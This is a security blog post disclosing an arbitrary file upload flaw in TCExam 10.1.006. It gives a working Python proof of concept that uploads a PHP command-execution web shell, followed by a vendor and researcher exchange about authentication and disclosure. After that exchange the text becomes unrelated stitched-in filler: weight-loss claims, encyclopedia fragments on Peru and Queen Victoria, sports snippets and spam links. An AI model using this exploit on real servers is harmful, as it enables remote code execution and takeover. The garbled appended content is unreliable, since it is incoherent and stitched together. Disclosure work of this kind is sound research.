### [TCExam 10.1.006 Arbitrary Upload](http://cross-site-scripting.blogspot.com/2010/06/tcexam-101006-arbitrary-upload.html)

An arbitrary upload vulnerability in tce\_functions\_tcecode\_editor.php of TCExam 10.1.006 can be exploited to upload a PHP shell.

PoC
TCExam-Shell.py
```
import sys, socket
host = 'localhost'
tc_exam = 'http://' + host + '/TCExam'
port = 80

def upload_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.settimeout(8)

    content = '------x\r\n'\
              'Content-Disposition: form-data; name="sendfile0"\r\n'\
              '\r\n'\
              'shell.php\r\n'\
              '------x\r\n'\
              'Content-Disposition: form-data; name="userfile0"; filename="shell.php"\r\n'\
              'Content-Type: application/octet-stream\r\n'\
              '\r\n'\
              '<?php echo "<pre>" + system($_GET["CMD"]) + "</pre>"; ?>\r\n'\
              '------x--\r\n'\
              '\r\n'

    header = 'POST ' + tc_exam + '/admin/code/tce_functions_tcecode_editor.php HTTP/1.1\r\n'\
             'Host: ' + host + '\r\n'\
             'Proxy-Connection: keep-alive\r\n'\
             'User-Agent: x\r\n'\
             'Content-Length: ' + str(len(content)) + '\r\n'\
             'Cache-Control: max-age=0\r\n'\
             'Origin: null\r\n'\
             'Content-Type: multipart/form-data; boundary=----x\r\n'\
             'Accept: text/html\r\n'\
             'Accept-Encoding: gzip,deflate,sdch\r\n'\
             'Accept-Language: en-US,en;q=0.8\r\n'\
             'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n'\
             'Cookie: LastVisit=1275442604\r\n'\
             '\r\n'

    s.send(header + content)

    http_ok = 'HTTP/1.1 200 OK'

    if http_ok not in s.recv(8192):
        print 'error uploading shell'
        return
    else: print 'shell uploaded'

    s.send('GET ' + tc_exam + '/cache/shell.php HTTP/1.1\r\n'\
           'Host: ' + host + '\r\n\r\n')

    if http_ok not in s.recv(8192): print 'shell not found'
    else: print 'shell located at ' + tc_exam + '/cache/shell.php'

upload_shell()
```

   This vulnerability has been fixed on TCExam 10.1.011.
   Now you can upload only the file types listed on K\_ALLOWED\_UPLOAD\_EXTENSIONS constant at admin/config/tce\_config.php.

   Anyway, the vulnerability description is WRONG because only TCExam administrators may upload files to the system (you can upload files only from administration area - that should be password protected - and if you have an editor level). This means that only TCExam administrators can hack themself!

   Please note that I haven't received any notice about this vulnerability, I've just discovered it casually and immediately fixed. I think that you should always contact authors before publishing a security advisory.

   Take another look at the code I posted. **No authentication is performed. This vulnerability can be exploited without logging in, and this has been verified by a 3rd party.**

   Note that Secunia rated this Highly Critical:

   <http://secunia.com/advisories/40011/>

   And regarding disclosure, I do this in my free time and given the number of vendors who've ignored me in the past I've decided to take an immediate, full disclosure route.

   Note that if you correctly install TCExam, you must set a webserver-level password for the entire administration area.

   Anyway, I've fixed the authentication issue on TCExam 10.1.012 for all cases.

    Anyway, the vulnerability description is WRONG because only TCExam administrators may upload files to the system (you can upload files only from administration area - that should be password protected - and if you have an editor level). This means that only TCExam administrators can hack themself!

    The prebiotic foods help to balance your digestive system, and when this functions optimally, you will naturally lose weight.

    In addition, it is thought they influence the hormones and help you to feel fuller more quickly, leading to less overeating and further natural weight loss.

    However, taking the right prebiotics daily can help you gradually and naturally shed some excess pounds over a period of months without you having to do anything else. Obviously taking regular exercise and trying to eat a healthy diet is always good advice too.

    In the early 19th century, while most of South America was swept by wars of independence, Peru remained a royalist stronghold. As the elite hesitated between emancipation and loyalty to the Spanish Monarchy, independence was achieved only after the military campaigns of José de San Martín and Simón Bolívar.[19] During the early years of the Republic, endemic struggles for power between military leaders caused political instability.[20] National identity was forged during this period, as Bolivarian projects for a Latin American Confederation floundered and a union with Bolivia proved ephemeral.[21] Between the 1840s and 1860s, Peru enjoyed a period of stability under the presidency of Ramón Castilla through increased state revenues from guano exports.[22] However, by the 1870s, these resources had been squandered, the country was heavily indebted, and political in-fighting was again on the rise.

    In Brussels, European ministers said Syrian repression risked taking the country down "a very dangerous path of violence, sectarian clashes and militarisation", according to AFP.

    The EU imposed a 10th round of sanctions on the government, placing bans on exporting gas and oil industry equipment to Syria and trading Syrian government bonds.

    Newcastle missed a host of second-half chances before Salomon Kalou sealed the points with a neat 88th-minute finish.

Monroe was 5ft 5in (I’m an inch shorter); just over eight stone (I’m ¾ of a stone heavier); she had a respectable BMI of 21 (don’t ask). She had an incredibly narrow back and rib cage but big boobs, so if she were to pop into Rigby & Peller for a bra fitting today she would probably be a 30E.

    Another thing I like is the way you can define custom actions in Netbeans that map to specific goals.

    Rightwise's new market cross only survived in its original form for a short time. In the English Reformation of the 1530s the rood on the pinnacle was pulled down and the oratory became a storeroom. The octagonal plinth became a shopping arcade of small stalls. In 1549 a temporary gallows was erected at the cross for the mass execution of 60 of the participants in Kett's Rebellion, who had congregated in the marketplace during their brief capture of Norwich.

    Gillingham F.C. is an English professional football club based in the town of Gillingham, Kent. The only Kent-based club in the Football League, they play their home matches at the Priestfield Stadium. In the 2008–09 season, the club was promoted to Football League One after victory over Shrewsbury Town in the League Two play-off final; however, they were relegated back into the basement division the following season. The club was founded in 1893 and joined the Football League in 1920. They were voted out of the league in favour of Ipswich Town at the end of the 1937–38 season, but returned to it 12 years later after it was expanded from 88 to 92 clubs.

    The Kyoto Protocol is a protocol to the United Nations Framework Convention on Climate Change (UNFCCC or FCCC), aimed at fighting global warming. The UNFCCC is an international environmental treaty with the goal of achieving the "stabilization of greenhouse gas concentrations in the atmosphere at a level that would prevent dangerous anthropogenic interference with the climate system."
    The Protocol was initially adopted on 11 December 1997 in Kyoto, Japan, and entered into force on 16 February 2005. As of September 2011, 191 states have signed and ratified the protocol. The only remaining signatory not to have ratified the protocol is the United States. Other states yet to ratify Kyoto include Afghanistan, Andorra and South Sudan, after Somalia ratified the protocol on 26 July 2010.

    In 2007 Fashiontv bought a cruise liner, named f.diamond, on which fashion shows, parties and events are hosted. Initially rumored to be a temporary 'stunt', renting a ship to boost ratings, these were quickly refuted after massive alterations to the ship's interior had been made. Currently many of the cruise liner's VIP events are also strongly featured in fashiontv's broadcasts.
    On January 28, 2009, due to a lack of security crew and permissions, the ship was blocked by the Capitaneria (Civil Navy Police) in Genoa, Italy.

     The Great Baltimore Fire raged in Baltimore, Maryland, United States, on Sunday, February 7, and Monday, February 8, 1904. 1,231 firefighters were required to bring the blaze under control. It destroyed a major part of central Baltimore, including over 1,500 buildings covering an area of some 140 acres (0.57 km2).
     One reason for the fire's duration was the lack of national standards in fire-fighting equipment. Although fire engines from nearby cities (such as Philadelphia and Washington, D.C. as well as units from New York City, Virginia, Wilmington, and Atlantic City) responded, many could not help because their hose couplings could not fit Baltimore's hydrants.

     In general, MPs may only speak once to any question, though they may be heard again to clarify their speeches if misunderstood or to seek a clarification of another MP's speech. If they do so, they are not allowed to introduce new matters.

     Queen Victoria (Alexandrina Victoria; 24 May 1819 – 22 January 1901) was the monarch of the United Kingdom of Great Britain and Ireland from 20 June 1837 until her death. From 1 May 1876, she used the additional title of Empress of India.
     Victoria was the daughter of Prince Edward, Duke of Kent and Strathearn, the fourth son of King George III. Both the Duke of Kent and the King died in 1820, and Victoria was raised under close supervision by her German-born mother Princess Victoria of Saxe-Coburg-Saalfeld[anger management completion letter](http://courtorderedangermanagement.com/sample-letter-of-completion)[fans and ait conditioners](http://www.electronicsshowplace.com/fans-conditioners-c-3300_3325.html)

     Mathematics is the study of quantity, space, structure, and change. Mathematicians seek out patterns and formulate new conjectures. Mathematicians resolve the truth or falsity of conjectures by mathematical proofs, which are arguments sufficient to convince other mathematicians of their validity. The research required to solve mathematical problems can take years or even centuries of sustained inquiry. However, mathematical proofs are less formal and painstaking than proofs in mathematical logic. Since the pioneering work of Giuseppe Peano (1858-1932), David Hilbert (1862-1943), and others on axiomatic systems in the late 19th century, it has become customary to view mathematical research as establishing truth by rigorous deduction from appropriately chosen axioms and definitions.

The garrison was reduced to the greatest extremities from want of provisions, and Colonel Graham undertook the perilous duty of conveying intelligence to the Imperial General Alvinzi, at Bassano, fifty miles distant, of their desperate situation.

It lacked built-in apps for key functions, including email, calendar, address book and BlackBerry Messenger. Tablet users had to connect to a BlackBerry smartphone for those functions for nearly a year, until RIM released the 2.0 version of the PlayBook's operating system last month.

     "When we saw John Paul, Cubans didn't really know anything about religion," Martinez said. "Now we're open more. We practice (religion) more. We believe more."

     Social sciences could also profit, says Nikolopoulos.
     "More and more people are interested in understanding the behaviors of societies as a whole. These require simulations -- how people interact, communicate, how they move. That will require exascale computing," he said.

     SQ3R is a method of taking notes from written material, though it might be better classed as a method of reading and gaining understanding. Material is skimmed to produce a list of headings, that are then converted into questions. These questions are then considered whilst the text is read to provide motivation for what is being covered. Notes are written under sections headed by the questions as each of the material's sections is read. One then makes a summary from memory, and reviews the notes.

     Each of these algal groups also includes various microscopic and single-celled organisms. There is good evidence that some of these algal groups arose independently from separate non-photosynthetic ancestors, with the result that many groups of algae are no longer classified within the plant kingdom as it is defined here.

     The majority of African Americans are Protestant of whom many follow the historically black churches.[72] Black church refers to churches which minister predominantly African American congregations. Black congregations were first established by freed slaves at the end of the 17th century, and later when slavery was abolished more African Americans were allowed to create a unique form of Christianity that was culturally influenced by African spiritual traditions.
